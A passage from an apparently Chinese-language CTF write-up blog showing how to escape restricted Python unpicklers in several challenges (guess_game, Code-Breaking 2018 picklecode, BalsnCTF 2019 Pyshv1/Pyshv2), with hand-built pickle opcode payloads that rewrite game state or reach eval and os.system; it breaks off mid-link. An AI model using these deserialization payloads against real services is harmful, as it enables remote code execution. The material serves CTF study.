<span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  对引入的模块进行检测</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>server 端将接收到的数据进行反序列，这里与常规的 <code>pickle.loads</code> 不同，采用的是 Python 提供的<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">安全措施</a>。也就是说，导入的模块只能以 <code>guess_name</code> 开头，并且名称里不能含有 <code>__</code>。</p><p>最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>只要能控制住 <code>curr_ticket</code>，每局就能稳赢，或者直接将 <code>win_count</code> 设为 10，能实现吗？</p><p><strong>先试试覆盖 <code>win_count</code> 和 <code>round_count</code></strong>。换句话来说，就是需要在反序列化 Ticket 对象前执行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># 具体实现在 pickle.py 的 1546 行</span></span><br></pre></td></tr></table></figure><p>开始构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S&apos;round_count&apos;</span><br><span class="line">I10</span><br><span class="line">sS&apos;win_count&apos;</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure><p>其中，<code>}</code> 是往 stack 中压入一个空 dict，<code>s</code> 是将键值对插入到 dict。</p><p>测试一下效果，成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p><p>到这就做完了吗？不，还有个小验证，<code>assert type(ticket) == Ticket</code>。</p><p>之前提到过，<code>pickle</code> 序列流执行完后将把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就好了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># 这里不能再用 0 号协议，否则会出现 ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>最终 payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cguess_game\ngame\n&#125;S&quot;win_count&quot;\nI10\nsS&quot;round_count&quot;\nI9\nsbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span><br></pre></td></tr></table></figure><p><strong>尝试覆盖掉 <code>current_ticket</code></strong>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S&apos;curr_ticket&apos;</span><br><span class="line">cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。</p><p>最终 payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cguess_game\ngame\n&#125;S&apos;curr_ticket&apos;\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x07sbp0\nsbg0\n.</span><br></pre></td></tr></table></figure><h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote><p>完整源码： <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p><code>getattr</code> 和 <code>globals</code> 并没有被禁，那就尝试写 pickle 吧。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&apos;get&apos;</span><br><span class="line">tRp100</span><br><span class="line">(cbuiltins</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;__builtins__&apos;</span><br><span class="line">tRp101</span><br><span class="line">0g100</span><br><span class="line">(g101</span><br><span class="line">S&apos;eval&apos;</span><br><span class="line">tR(S&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 <code>builtins</code> 是一个 <code>dict</code>，所以用了两次 <code>get</code>，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure><p>限制了导入的模块只能是 <code>sys</code>，问题是这个模块也不安全呀 ：）</p><blockquote><p><code>sys.modules</code></p><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p></blockquote><p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 <code>os</code>，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 </p><p>这里的 <code>find_class</code> 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>其中 <code>sys.modules</code> 为：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的目标：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure><p>限制了 module 只能为 sys，那能否把 <code>sys.modules[&#39;sys&#39;]</code>替换为<code>sys.modules[&#39;os&#39;]</code>，从而引入危险模块。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure><p>本地实验一下，成功：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)] on win32</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[&apos;sys&apos;] = modules[&apos;os&apos;]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(&apos;dir&apos;)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line">2019/10/15  20:36    &lt;DIR&gt;          .</span><br><span class="line">2019/10/15  20:36    &lt;DIR&gt;          ..</span><br><span class="line">2019/08/22  21:02             2,750 .aggressor.prop</span><br><span class="line">2019/09/16  00:09    &lt;DIR&gt;          .anaconda</span><br><span class="line">2019/04/09  13:58    &lt;DIR&gt;          .android</span><br><span class="line">2018/12/13  14:37    &lt;DIR&gt;          .astropy</span><br><span class="line">2019/10/15  20:36            18,465 .bash_history</span><br><span class="line">2019/04/07  12:03    &lt;DIR&gt;          .CLion2019.1</span><br></pre></td></tr></table></figure><p>还有个小麻烦，<code>modules</code> 是个 <code>dict</code>，无法直接取值。继续利用 <code>getattr(sys.modules[module], name)</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure><p>改写成 pickle：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S&apos;sys&apos;</span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line">get</span><br><span class="line">(S&apos;os&apos;</span><br><span class="line">tRp101</span><br><span class="line">0S&apos;sys&apos;</span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line">system</span><br><span class="line">(S&apos;dir&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure><p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p>好了，问题又转变为如何获取键值，还是比较艰难。</p><p>查文档时又发现了一个东西，原来 <code>__import__</code> 可被覆盖。</p><blockquote><p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p><p>此函数会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义，但是 <strong>强烈</strong> 不建议这样做，因为使用导入钩子 (参见 <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> 而应该用 <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>。</p></blockquote><p>那该覆盖成什么函数呢？最好是 <code>__import__(module)</code> 后能返回字典的函数。</p><p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p><p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p><p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" 